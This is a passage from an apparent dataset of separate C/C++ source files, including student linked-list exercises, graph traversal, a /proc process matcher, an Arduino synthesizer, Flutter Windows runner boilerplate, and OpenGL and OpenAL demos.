\u0111\u00e3 s\u1eafp x\u1ebfp theo m\u00e3 sinh vi\u00ean\nvoid insertSorted(List &list, SinhVien sv) {\n    Node* newNode = new Node;   // T\u1ea1o n\u00fat m\u1edbi\n    newNode->data = sv;         // G\u00e1n d\u1eef li\u1ec7u sinh vi\u00ean v\u00e0o n\u00fat m\u1edbi\n    newNode->link = NULL;       // Kh\u1edfi t\u1ea1o con tr\u1ecf link l\u00e0 NULL\n\n    if (list.first == NULL || compareMaSV(sv.maSV, list.first->data.maSV) < 0) {\n        // Th\u00eam v\u00e0o \u0111\u1ea7u danh s\u00e1ch n\u1ebfu danh s\u00e1ch r\u1ed7ng ho\u1eb7c m\u00e3 sinh vi\u00ean l\u00e0 nh\u1ecf nh\u1ea5t\n        newNode->link = list.first;\n        list.first = newNode;\n        if (list.last == NULL) list.last = newNode; // N\u1ebfu danh s\u00e1ch r\u1ed7ng, c\u1eadp nh\u1eadt last\n    } else {\n        // T\u00ecm v\u1ecb tr\u00ed ph\u00f9 h\u1ee3p \u0111\u1ec3 ch\u00e8n v\u00e0o danh s\u00e1ch\n        Node* current = list.first;\n        while (current->link != NULL && compareMaSV(current->link->data.maSV, sv.maSV) < 0) {\n            current = current->link;\n        }\n        newNode->link = current->link; // Li\u00ean k\u1ebft n\u00fat m\u1edbi v\u00e0o danh s\u00e1ch\n        current->link = newNode;\n        if (newNode->link == NULL) list.last = newNode; // C\u1eadp nh\u1eadt last n\u1ebfu l\u00e0 n\u00fat cu\u1ed1i\n    }\n}\n\n// H\u00e0m in danh s\u00e1ch sinh vi\u00ean\nvoid printList(const List &list) {\n    Node* current = list.first;\n    while (current != NULL) {\n        printf(\"Ma SV: %s - Ho ten: %s\\n\", current->data.maSV, current->data.hoTen);\n        current = current->link;\n    }\n}\n\n// H\u00e0m ki\u1ec3m tra ng\u00e0y sinh c\u00f3 gi\u1ed1ng nhau kh\u00f4ng\nint sameBirthday(Ngay ngay1, Ngay ngay2) {\n    return (ngay1.ngay == ngay2.ngay && ngay1.thang == ngay2.thang && ngay1.nam == ngay2.nam);\n}\n\n// H\u00e0m in c\u00e1c sinh vi\u00ean c\u00f3 c\u00f9ng ng\u00e0y sinh\nvoid printStudentsWithSameBirthday(const List &list, Ngay ngaySinh) {\n    Node* current = list.first;\n    int found = 0; // Bi\u1ebfn \u0111\u1ec3 ki\u1ec3m tra xem c\u00f3 sinh vi\u00ean n\u00e0o c\u00f9ng ng\u00e0y sinh kh\u00f4ng\n\n    while (current != NULL) {\n        if (sameBirthday(current->data.ngaySinh, ngaySinh)) {\n            printf(\"Ma SV: %s - Ho ten: %s\\n\", current->data.maSV, current->data.hoTen);\n            found = 1;\n        }\n        current = current->link;\n    }\n\n    if (!found) {\n        printf(\"Khong tim thay sinh vien cung ngay sinh\\n\");\n    }\n}\n\n// H\u00e0m x\u00f3a sinh vi\u00ean c\u00f3 c\u00f9ng ng\u00e0y sinh\nvoid removeStudentsWithSameBirthday(List &list, Ngay ngaySinh) {\n    Node* current = list.first;\n    Node* prev = NULL; // Con tr\u1ecf tr\u1ecf \u0111\u1ebfn n\u00fat tr\u01b0\u1edbc \u0111\u00f3 trong danh s\u00e1ch\n\n    while (current != NULL) {\n        if (sameBirthday(current->data.ngaySinh, ngaySinh)) {\n            // N\u1ebfu t\u00ecm th\u1ea5y sinh vi\u00ean c\u00f3 c\u00f9ng ng\u00e0y sinh\n            if (prev == NULL) {\n                // X\u00f3a sinh vi\u00ean \u0111\u1ea7u danh s\u00e1ch\n                list.first = current->link;\n            } else {\n                // X\u00f3a sinh vi\u00ean \u1edf gi\u1eefa ho\u1eb7c cu\u1ed1i danh s\u00e1ch\n                prev->link = current->link;\n            }\n\n            if (current->link == NULL) {\n                list.last = prev; // C\u1eadp nh\u1eadt n\u1ebfu l\u00e0 n\u00fat cu\u1ed1i\n            }\n\n            Node* temp = current;\n            current = current->link;\n            delete temp; // Gi\u1ea3i ph\u00f3ng b\u1ed9 nh\u1edb c\u1ee7a n\u00fat \u0111\u00e3 x\u00f3a\n        } else {\n            prev = current;\n            current = current->link;\n        }\n    }\n}\n\nint main() {\n    List list; // Kh\u1edfi t\u1ea1o danh s\u00e1ch sinh vi\u00ean\n    initList(list); // G\u1ecdi h\u00e0m kh\u1edfi t\u1ea1o danh s\u00e1ch r\u1ed7ng\n\n    // V\u00ed d\u1ee5 th\u00eam sinh vi\u00ean\n    SinhVien sv1 = {\"001\", \"TaThiKimHue\", 1, {1, 1, 1999}, \"HaNoi\", \"CNTT\", \"IT\"};\n    SinhVien sv2 = {\"002\", \"TranThiKimThoa\", 1, {5, 7, 1999}, \"HaiPhong\", \"DTVT\", \"ET\"};\n    SinhVien sv3 = {\"003\", \"TranQuangAnh\", 0, {6, 5, 2004}, \"HaNoi\", \"DTVT\", \"ET-E9\"};\n    SinhVien sv4 = {\"004\", \"TruongQuocAnh\", 0, {6, 5, 2004}, \"HaNoi\", \"DT",
    "#include \"algorithms.hpp\"\n#include <queue>\n#include <stack>\n#include <vector>\n\nvoid Algorithms::breadthFirstSearch(const Node &startNode) {\n\tconst Graph &graph = Graph::getInstance();\n\tstd::queue<Node> q;\n\tstd::unordered_map<int, bool> visited;\n\n\tq.push(startNode);\n\tvisited[startNode.id] = true;\n\n\twhile (!q.empty()) {\n\t\tNode current = q.front();\n\t\tq.pop();\n\t\tstd::cout << \"Visiting node: \" << current.id << std::endl;\n\n\t\tfor (const auto &neighbor : graph.getNeighbors(current)) {\n\t\t\tif (!visited[neighbor.id]) {\n\t\t\t\tq.push(neighbor);\n\t\t\t\tvisited[neighbor.id] = true;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid Algorithms::depthFirstSearch(const Node &startNode) {\n\tconst Graph &graph = Graph::getInstance();\n\tstd::stack<Node> s;\n\tstd::unordered_map<int, bool> visited;\n\n\ts.push(startNode);\n\n\twhile (!s.empty()) {\n\t\tNode current = s.top();\n\t\ts.pop();\n\n\t\tif (!visited[current.id]) {\n\t\t\tstd::cout << \"Visiting node: \" << current.id << std::endl;\n\t\t\tvisited[current.id] = true;\n\n\t\t\tfor (const auto &neighbor : graph.getNeighbors(current)) {\n\t\t\t\tif (!visited[neighbor.id]) s.push(neighbor);\n\t\t\t}\n\t\t}\n\t}\n}\n",
    "// Brij Malhotra\n// hw3.cpp\n// Purpose: Create a program that reads in data from a file and displays it in the original order according to the number\n\n#include <iostream>\n#include <string>\n#include <sstream> \n#include <fstream>\n#include <iomanip>\n#include <cstdlib>\n\nusing namespace std;\n\nclass Line\n{\n    private:\n        \n        struct Node {\n            int order;\n            Node * next;\n            string name;\n        };\n        Node * head;\n\n    public: \n        \n        Line(){\n            head = nullptr;\n        }\n\n        ~Line(){\n            Node * curr;\n            Node * next;\n\n            curr = head;\n\n            while (curr!=nullptr){\n                next = curr->next;\n                delete curr;\n                curr = next;\n            }\n            head = nullptr;\n        }\n\n        void Insert(int num, string name){\n\n            Node * newNode = nullptr;\n            Node * curr = nullptr;\n            Node * prev = nullptr;\n\n            newNode = new Node();\n            newNode->order = num;\n            newNode->name = name;\n            newNode->next = nullptr;\n\n            if (!head){\n                head = newNode;\n            } else{\n                curr = head;\n                prev = nullptr;\n                \n                while (curr!= nullptr && curr->order < num){\n                    prev = curr;\n                    curr = curr->next;\n                }\n\n                if (prev == nullptr){\n                    head = newNode;\n                    newNode->next = curr;\n                } else{\n                    prev->next = newNode;\n                    newNode->next = curr;\n                }\n            }\n        }\n\n        void display(){\n            Node * nodePtr;\n            nodePtr = head;\n            \n            while (nodePtr){\n                cout << nodePtr->name << \" \" << nodePtr->order << \" \" << endl;\n\n                nodePtr = nodePtr->next;\n            }\n        }\n};\n\nint main(){\n\n    // Line org;\n    string filename;\n    ifstream infile;\n    int num;\n    \n    cout << endl;\n    while(true){\n        Line org;\n        \n        cout << \"Enter a filename to view (select CTRL C to exit the program): \";\n        getline(cin, filename);\n\n        infile.open(filename);\n        while (!infile){\n            cout << endl;\n            cout << \"Please enter a valid filename: \";\n            getline(cin, filename);\n            infile.close();\n            infile.open(filename);\n        }\n\n        cout << endl;\n        cout << \"The file contents are: \" << endl << endl;\n\n        while (!infile.eof()){\n            string string1, string2;\n        \n            getline(infile, string1, ' ');\n            getline(infile, string2, '\\n');\n\n            num = stoi(string2);\n            cout << string1 << \" \" <<  string2 << endl;\n            org.Insert(num, string1);\n        }\n\n        cout << endl;\n        cout << \"The original order of the line is: \" << endl << endl;\n        org.display();\n        cout << endl;\n        org.~Line();\n        infile.close();\n    }\n    cout << endl << endl;\n   \n    return 0;\n}",
    "#include <algorithm>\n#include <cctype>\n\n#include \"simple_match.hpp\"\n#include \"pgrap.hpp\"\n#include \"util.hpp\"\n\nstatic inline bool has_match_cond(SimpleMatch ctr,\n\t\t\t\t  const std::string &data) noexcept {\n    switch (ctr) {\n\t// Match all and first characters\n    case SimpleMatch::match_all:\n\treturn true;\n    case SimpleMatch::match_first_lowercase_only:\n\treturn std::islower(data.front());\n    case SimpleMatch::match_first_uppercase_only:\n\treturn std::isupper(data.front());\n    case SimpleMatch::match_first_digit_only:\n\treturn std::isdigit(data.front());\n    case SimpleMatch::match_first_alpha_only:\n\treturn std::isalpha(data.front());\n    case SimpleMatch::match_first_alnum_only:\n\treturn std::isalnum(data.front());\n\n\t// Match last character\n    case SimpleMatch::match_last_lowercase_only:\n\treturn std::islower(data.back());\n    case SimpleMatch::match_last_uppercase_only:\n\treturn std::isupper(data.back());\n    case SimpleMatch::match_last_digit_only:\n\treturn std::isdigit(data.back());\n    case SimpleMatch::match_last_alpha_only:\n\treturn std::isalpha(data.back());\n    case SimpleMatch::match_last_alnum_only:\n\treturn std::isalnum(data.back());\n\n\t// Match all characters\n    case SimpleMatch::match_all_lowercase_only:\n\treturn std::all_of(data.begin(), data.end(),\n\t\t\t   [](auto c) { return std::islower(c); });\n    case SimpleMatch::match_all_uppercase_only:\n\treturn std::all_of(data.begin(), data.end(),\n\t\t\t   [](auto c) { return std::isupper(c); });\n    case SimpleMatch::match_all_digit_only:\n\treturn std::all_of(data.begin(), data.end(),\n\t\t\t   [](auto c) { return std::isdigit(c); });\n    case SimpleMatch::match_all_alpha_only:\n\treturn std::all_of(data.begin(), data.end(),\n\t\t\t   [](auto c) { return std::isalpha(c); });\n    case SimpleMatch::match_all_alnum_only:\n\treturn std::all_of(data.begin(), data.end(),\n\t\t\t   [](auto c) { return std::isalnum(c); });\n\n\t// Else string didn't match with anything above \n    default:\n\treturn false;\n    }\n}\n\nstd::pair<std::int64_t, std::vector<Process>> simple_match(SimpleMatch pm) {\n    std::vector<Process> list;\n    std::int64_t how_many = 0;\n\n    DIR *dir = opendir(\"/proc\");\n    if (dir == nullptr)\n\terror::make_error(\"error: cannot open /proc. Is it properly mounted?\");\n\n    struct dirent *den;\n\n    while ((den = readdir(dir)) != nullptr) {\n\tconst auto file_name = std::string_view(den->d_name);\n\tif (!contains_only_digits(file_name))\n\t    continue;\n\n\tconst auto path = fmt::format(\"/proc/{}/comm\", file_name);\n\tconst auto data = read_to_string(path);\n        if (has_match_cond(pm, data)) {\n\t    pid_t pid = 0;\n\t    std::from_chars(file_name.data(), file_name.data() + file_name.size(), pid);\n\t    list.push_back(Process{pid, data});\n\t    ++how_many;\n\t}\n    }\n\n    return {how_many, list};\n}\n",
    "// Include the required librariess\n#include \"Arduino.h\"\n#include <RotaryEncoder.h>\n#include <elapsedMillis.h>\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n#include \"TeensyThreads.h\"\n#include <RBD_Timer.h>\n#include <RBD_Button.h>\n#include \"parameters.h\"\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n#include <Audio.h>\n#include <Wire.h>\n#include <SPI.h>\n#include <SD.h>\n#include <SerialFlash.h>\n\n// GUItool: begin automatically generated code\nAudioSynthWaveform ModFreq;           // xy=179,108\nAudioSynthWaveformModulated MainFreq; // xy=319,163\nAudioEffectEnvelope envelope1;        // xy=447,223\nAudioEffectDelay delay1;              // xy=563,341\nAudioEffectDelay delay2;              // xy=720,403\nAudioMixer4 mixer1;                   // xy=817,255\nAudioMixer4 mixer2;                   // xy=948,342\nAudioOutputI2S i2s1;                  // xy=1151,342\nAudioConnection patchCord1(ModFreq, 0, MainFreq, 0);\nAudioConnection patchCord2(MainFreq, envelope1);\nAudioConnection patchCord3(envelope1, 0, mixer1, 0);\nAudioConnection patchCord4(envelope1, delay1);\nAudioConnection patchCord5(delay1, 0, mixer1, 1);\nAudioConnection patchCord6(delay1, 1, mixer1, 2);\nAudioConnection patchCord7(delay1, 1, delay2, 0);\nAudioConnection patchCord8(delay2, 0, mixer1, 3);\nAudioConnection patchCord9(delay2, 1, mixer2, 1);\nAudioConnection patchCord10(mixer1, 0, mixer2, 0);\nAudioConnection patchCord11(mixer2, 0, i2s1, 0);\nAudioConnection patchCord12(mixer2, 0, i2s1, 1);\nAudioControlSGTL5000 sgtl5000_1; // xy=551,611\n// GUItool: end automatically generated code\n\n// IO objects\nRotaryEncoder encoderMainFreq(33, 34, RotaryEncoder::LatchMode::TWO03);\nRotaryEncoder encoderLfoFreq(35, 36, RotaryEncoder::LatchMode::TWO03);\nRotaryEncoder encoderLfoAmplitude(37, 38, RotaryEncoder::LatchMode::TWO03);\nRotaryEncoder encoderDelayTime(28, 27, RotaryEncoder::LatchMode::TWO03);\nRotaryEncoder encoderDelayFeedback(30, 29, RotaryEncoder::LatchMode::TWO03);\nRotaryEncoder encoderLfoWaveform(31, 32, RotaryEncoder::LatchMode::FOUR3);\nRotaryEncoder encoders[6] = {encoderMainFreq, encoderLfoFreq, encoderLfoAmplitude, encoderDelayTime, encoderDelayFeedback, encoderLfoWaveform};\n\n// Variables to remember positions of encoders\nint encoderMainFreqPosition = 0;\nint encoderLfoFreqPosition = 0;\nint encoderLfoAmplitudePosition = 0;\nint encoderDelayTimePosition = 0;\nint encoderDelayFeedbackPosition = 0;\nint encoderLfoWaveformPosition = 0;\nint encoderPositions[6] = {encoderMainFreqPosition,\n                           encoderLfoFreqPosition,\n                           encoderLfoAmplitudePosition,\n                           encoderDelayTimePosition,\n                           encoderDelayFeedbackPosition,\n                           encoderLfoWaveformPosition};\n\n// Button object\nRBD::Button playSound(41, true);\n\n// Synthetization parameters of the dub siren sound\n// The objects used here are in parameters.h\n// The String name parameter in these is a leftover from when this was supposed to have a display\nparameter paramMainFreq(\"Main Frequency\", 20.0f, 10000.0f);\nparameter paramLfoFreq(\"LFO Frequency\", 0.01f, 20.0f);\nparameter paramLfoAmplitude(\"LFO Amplitude\", 0.0f, 0.6f);\nparameter paramDelayTime(\"Delay Time\", 0.05f, 1000.0f);\nparameter paramDelayFeedback(\"Delay Feedback\", 0.0f, 1.0f);\n\nvoid updateParam(int paramIndex, bool increment)\n{\n  switch (paramIndex)\n  {\n  // Main freq.\n  case 0:\n    paramMainFreq.update(increment);\n    MainFreq.frequency(paramMainFreq.getValue());\n  case 1:\n    paramLfoFreq.update(increment);\n    ModFreq.frequency(paramLfoFreq.getValue());\n    break;\n  case 2:\n    paramLfoAmplitude.update(!increment);\n    ModFreq.amplitude(paramLfoAmplitude.getValue());\n    break;\n  case 3:\n    paramDelayTime.update(increment);\n    delay1.delay(0, paramDelayTime.getValue());\n    delay1.delay(1, paramDelayTime.getValue() * 2.0f);\n    delay2.delay(0, paramDelayTime.getValue());\n    delay2.delay(1, paramDelayTime.getValue() * 2.0f);\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"movieapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n#include <SFML/Audio.hpp>\n#include <glm/glm.hpp>\n#include <iostream>\n#include <vector>\n#include <array>\n#include <algorithm>\n#include <random>\n\n#include \"window/window.hpp\"\n#include \"camera/camera.hpp\"\n#include \"texture/texture.hpp\"\n#include \"shader/shader.hpp\"\n#include \"mesh/mesh.hpp\"\n#include \"model/model.hpp\"\n#include \"chunk/chunk.hpp\"\n#include \"player/player.hpp\"\n#include \"framebuffer/framebuffer.hpp\"\n#include \"sprite2d/sprite2d.hpp\"\n#include \"animation/animation.hpp\"\n#include \"bilboard2d/bilboard2d.hpp\"\n#include \"enemy/enemy.hpp\"\n\n\nstruct SunLight\n{\n\tstatic glm::vec3 _ambient;\n\tstatic glm::vec3 _diffuse;\n\tstatic glm::vec3 _specular;\n\tstatic glm::vec3 _direction;\n\tSunLight()\n\t{\n\t\t\n\t}\n};\n\nglm::vec3 SunLight::_ambient;\nglm::vec3 SunLight::_diffuse;\nglm::vec3 SunLight::_specular;\nglm::vec3 SunLight::_direction;\n\nclass Light\n{\nprivate:\n\tglm::vec3 _ambient;\n\tglm::vec3 _diffuse;\n\tglm::vec3 _specular;\n\t    \n    float _constant;\n    float _linear;\n    float _quadratic;  \n\tfloat _strength;\n\t\n    glm::vec3 _position;\n\n\tstatic std::vector<Light*> _lights;\n\t\npublic:\n\tLight(\n\t\tglm::vec3 ambient, \n\t\tglm::vec3 diffuse, \n\t\tglm::vec3 specular, \n\t\tfloat constant, \n\t\tfloat linear, \n\t\tfloat quadratic\n\t) :\n\t\t_ambient(ambient), \n\t\t_diffuse(diffuse), \n\t\t_specular(specular), \n\t\t_constant(constant), \n\t\t_linear(linear), \n\t\t_quadratic(quadratic)\n\t{\n\t\t_lights.push_back(this);\n\t\t_strength = 1.0f;\n\t}\n\n\tvoid setConstant(float constant)\n\t{\n\t\t_constant = constant;\n\t}\t\n\n\tvoid setLinear(float linear)\n\t{\n\t\t_constant = linear;\n\t}\t\n\n\tvoid setQuadratic(float quadratic)\n\t{\n\t\t_quadratic = quadratic;\n\t}\n\t\n\tvoid setPosition(glm::vec3 position)\n\t{\n\t\t_position = position;\n\t}\n\n\tvoid setStrength(float strength)\n\t{\n\t\t_strength = strength;\n\t}\n\t\n\tglm::vec3 getAmbient() const\n\t{\n\t\treturn _ambient;\n\t}\n\n\tglm::vec3 getDiffuse() const\n\t{\n\t\treturn _diffuse;\n\t}\n\n\tglm::vec3 getSpecular() const\n\t{\n\t\treturn _specular;\n\t}\n\n\tfloat getConstant() const\n\t{\n\t\treturn _constant;\n\t}\n\n\tfloat getLinear() const\n\t{\n\t\treturn _linear;\n\t}\n\n\tfloat getQuadratic() const\n\t{\n\t\treturn _quadratic;\n\t}\n\t\n\tglm::vec3 getPosition() const\n\t{\n\t\treturn _position;\n\t}\n\n\tfloat getStrength() const\n\t{\n\t\treturn _strength;\n\t}\n\t\n\tstatic void draw(Model model)\n\t{\n\t\tmodel.setVector3f(\"viewPos\", Camera::position);\n\n\t\tmodel.setVector3f(\"dirLight.ambient\", SunLight::_ambient);\n\t\tmodel.setVector3f(\"dirLight.diffuse\", SunLight::_diffuse);\n\t\tmodel.setVector3f(\"dirLight.specular\", SunLight::_specular);\n\t\tmodel.setVector3f(\"dirLight.direction\", SunLight::_direction);\n\t\t\n\t\tfor(unsigned int i = 0; i < _lights.size(); i++)\n\t\t{\n\t\t\tauto light = _lights[i];\n\n\t\t\tstd::string uniformName = \"lights[\" + std::to_string(i) + \"].\";\n\t\t\tmodel.setVector3f(uniformName + \"position\", light->getPosition());\n\t\t\tmodel.setVector3f(uniformName + \"ambient\", light->getAmbient());\n\t\t\tmodel.setVector3f(uniformName + \"diffuse\", light->getDiffuse());\n\t\t\tmodel.setVector3f(uniformName + \"specular\", light->getSpecular());\n\t\t\tmodel.setFloat(uniformName + \"constant\", light->getConstant());\n\t\t\tmodel.setFloat(uniformName + \"linear\", light->getLinear());\n\t\t\tmodel.setFloat(uniformName + \"quadratic\", light->getQuadratic());\n\t\t\tmodel.setFloat(uniformName + \"strength\", light->getStrength());\n\t\t}\n\t\t\n\t\tmodel.draw();\n\t}\n\n\tstatic unsigned int getLightsAmount()\n\t{\n\t\treturn _lights.size();\n\t}\n};\n\nstd::vector<Light*> Light::_lights;\n\n#define RGB2VEC3(r,g,b) glm::vec3(1.0f/255.0f*float(r),1.0f/255.0f*float(g),1.0f/255.0f*float(b))\n \nint randint(int min, int max)\n{\n\treturn (rand() % (max - min)) + min;\n}\n\n\nint main()\n{\n\tfloat mapWidth = 100.0f;\n\tfloat mapDepth = 100.0f;\n\t\n\tint windowW = 1024;\n\tint windowH = 1024;\n\tstd::string windowName = \"EngineGLFW C++\";\n    GLFWwindow* window = initWindow(windowW, windowH, windowName);\n\tif(!window)\n\t{\n\t\tstd::cout << \"initWindow() error\\n\";\n\t\tglfwTerminate();\n\t}\n\n\tunsigned int playerScore = 0;\n\t\n\t// depth test\n\tglEnable(GL_DEPTH_TEST);\n\t// multisample\n\tglEnable(GL_MULTISAMPLE);\n\t// stencil buffer (for outlining)\n    // clear color\n\tglClearColor(0.4, 0.5, 0.9, 1.0);\n\n\tCamera::setProperties(windowW, windowH, 75.0f, 0.01f, 500.0f);\n\tCamera::setPosition(glm::vec3(0.0f, 0.0f, 1.0f));\n\tSprite2D::init();\n\t\n\tBilboard2D::init();\n\n\tfloat loadingScreenProgress = 0.0f;\n\tTexture loadingScreenTexture = Texture::loadFromFile(\"textures/loadingScreen.png\");\n\tShader loadingScreenShader = Shader::loadFromFile(\"shaders/loadingScreen.vs\", \"shaders/loadingScreen.fs\");\n\tSprite2D loadingScreenSprite(loadingScreenShader);\n\tloadingScreenSprite.setScale(windowW, windowH);\n\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tloadingScreenProgress += 0.05f;\n\tloadingScreenSprite.setTexture(\"texture0\", loadingScreenTexture);\n\tloadingScreenSprite.setFloat(\"progress\", loadingScreenProgress);\n\tloadingScreenSprite.draw();\n\tglfwSwapBuffers(window);\n\tglfwPollEvents();\n\n\tsf::Music music;\n\tif (!music.openFromFile(\"sounds/Omission.ogg\"))\n\t{\n\t\tstd::cout << \"Failed to load Omission.ogg\\n\";\n\t}\n\tmusic.setLoop(true);\n\n\t// L",
    "// Include necessary headers\n#include <AL/al.h>\n#include <AL/alc.h>\n#include <vector>\n#include <iostream>\n#include <cmath>\n\n// Function to initialize OpenAL and create a context\nALCdevice* InitOpenAL(ALCcontext*& context) {\n    ALCdevice* device = alcOpenDevice(nullptr); // Open default device\n    if (!device) {\n        std::cerr << \"Failed to open OpenAL device.\" << std::endl;\n        return nullptr;\n    }\n\n    context = alcCreateContext(device, nullptr);\n    if (!context) {\n        std::cerr << \"Failed to create OpenAL context.\" << std::endl;\n        alcCloseDevice(device);\n        return nullptr;\n    }\n\n    alcMakeContextCurrent(context);\n    return device;\n}\n\n// Function to clean up OpenAL resources\nvoid CleanUpOpenAL(ALCdevice* device, ALCcontext* context) {\n    alcMakeContextCurrent(nullptr);\n    alcDestroyContext(context);\n    alcCloseDevice(device);\n}\n\n// Function to configure 3D listener properties\nvoid ConfigureListener() {\n    ALfloat listenerPos[] = { 0.0f, 0.0f, 0.0f };\n    ALfloat listenerVel[] = { 0.0f, 0.0f, 0.0f };\n    ALfloat listenerOri[] = { 0.0f, 0.0f, -1.0f, 0.0f, 1.0f, 0.0f }; // Forward and Up vectors\n\n    alListenerfv(AL_POSITION, listenerPos);\n    alListenerfv(AL_VELOCITY, listenerVel);\n    alListenerfv(AL_ORIENTATION, listenerOri);\n}\n\n// Function to load and play a sound buffer in 3D space\nALuint LoadSoundBuffer(const std::string& filename) {\n    // Dummy implementation: You would normally load data here using libraries like libsndfile\n    ALuint buffer;\n    alGenBuffers(1, &buffer);\n    // Load audio data into buffer... (omitted for simplicity)\n    return buffer;\n}\n\n// Function to create a source for 3D playback\nvoid Create3DSource(ALuint buffer, const ALfloat* sourcePos, const ALfloat* sourceVel) {\n    ALuint source;\n    alGenSources(1, &source);\n\n    alSourcef(source, AL_PITCH, 1.0f);\n    alSourcef(source, AL_GAIN, 1.0f);\n    alSourcefv(source, AL_POSITION, sourcePos);\n    alSourcefv(source, AL_VELOCITY, sourceVel);\n    alSourcei(source, AL_LOOPING, AL_FALSE);\n    alSourcei(source, AL_BUFFER, buffer);\n\n    alSourcePlay(source);\n}\n\n// Implement reverberation effect using OpenAL EFX (OpenAL Effects Extension)\nvoid ApplyReverb(ALuint source) {\n    ALuint effect;\n    alGenEffects(1, &effect);\n    alEffecti(effect, AL_EFFECT_TYPE, AL_EFFECT_REVERB);\n    alEffectf(effect, AL_REVERB_DECAY_TIME, 2.0f); // Example reverb parameters\n\n    ALuint effectSlot;\n    alGenAuxiliaryEffectSlots(1, &effectSlot);\n    alAuxiliaryEffectSloti(effectSlot, AL_EFFECTSLOT_EFFECT, effect);\n\n    alSource3i(source, AL_AUXILIARY_SEND_FILTER, effectSlot, 0, AL_FILTER_NULL);\n}\n\n// Simulating beamforming for spatial audio accuracy\nvoid BeamformAudio(ALuint source, float angle) {\n    // Set directional parameters to simulate beamforming\n    ALfloat direction[] = { std::cos(angle), 0.0f, std::sin(angle) };\n    alSourcefv(source, AL_DIRECTION, direction);\n    alSourcef(source, AL_CONE_INNER_ANGLE, 30.0f);  // Narrow cone for focused sound\n    alSourcef(source, AL_CONE_OUTER_ANGLE, 60.0f);  // Wider cone for fading sound\n    alSourcef(source, AL_CONE_OUTER_GAIN, 0.1f);    // Attenuate outside the cone\n}\n\n// Entry point\nint main() {\n    ALCcontext* context;\n    ALCdevice* device = InitOpenAL(context);\n    if (!device) {\n        return -1;\n    }\n\n    ConfigureListener();\n\n    // Example source setup\n    ALfloat sourcePos[] = { 2.0f, 0.0f, -5.0f };\n    ALfloat sourceVel[] = { 0.0f, 0.0f, 0.0f };\n    ALuint buffer = LoadSoundBuffer(\"sound.wav\");\n    Create3DSource(buffer, sourcePos, sourceVel);\n\n    // Apply reverberation\n    ApplyReverb(buffer);\n\n    // Apply beamforming simulation\n    BeamformAudio(buffer, 45.0f * (3.14159f / 180.0f));\n\n    // Main loop\n    while (true) {\n        // Placeholder for a real-time rendering loop\n    }\n\n    // Clean up OpenAL resources\n    CleanUpOpenAL(device, context);\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mudanca_botao\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
